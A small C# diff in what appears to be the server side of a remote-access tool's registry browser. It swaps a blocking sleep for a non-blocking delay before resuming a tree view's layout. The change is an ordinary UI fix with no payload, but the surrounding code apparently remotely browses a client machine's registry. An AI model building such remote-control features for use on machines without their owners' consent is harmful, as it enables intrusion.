@@ -346,8 +346,14 @@ namespace Server.Forms
                 msgpack.ForcePathObject("RootKeyName").AsString = parentNode.FullPath;
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
 
-                Thread.Sleep(500);
-                tvRegistryDirectory.ResumeLayout();
+                // Non-blocking delay
+                System.Threading.Tasks.Task.Delay(500).ContinueWith(_ => 
+                {
+                    if (tvRegistryDirectory.InvokeRequired)
+                        tvRegistryDirectory.Invoke(new Action(() => tvRegistryDirectory.ResumeLayout()));
+                    else
+                        tvRegistryDirectory.ResumeLayout();
+                });
 
                 e.Cancel = true;
             }
